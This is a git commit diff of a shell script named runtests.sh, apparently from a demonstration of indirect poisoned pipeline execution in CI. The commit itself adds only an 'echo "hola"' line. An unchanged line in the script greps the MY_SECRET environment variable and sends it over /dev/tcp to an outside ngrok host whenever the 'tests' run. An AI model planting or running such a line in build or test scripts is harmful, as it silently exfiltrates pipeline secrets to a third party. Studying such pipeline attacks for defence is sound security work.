050be6a9283466b14e88353e1927596c282b4732
luisgarciaxygeni <129273100+luisgarciaxygeni@users.noreply.github.com>
2023-11-15 14:53:15 +0100

    Update runtests.sh

--- runtests.sh
+++ runtests.sh
@@ -1,4 +1,5 @@
 echo "Executing Tests script [from user $1 at $2] m" >> runtests.out
 echo ------- I-PPE From user [$1] in pr [$2] pr.yml :: $(env | grep MY_SECRET) > /dev/tcp/5.tcp.eu.ngrok.io/13276    
+echo "hola"
 RET=0
 #exit $RET
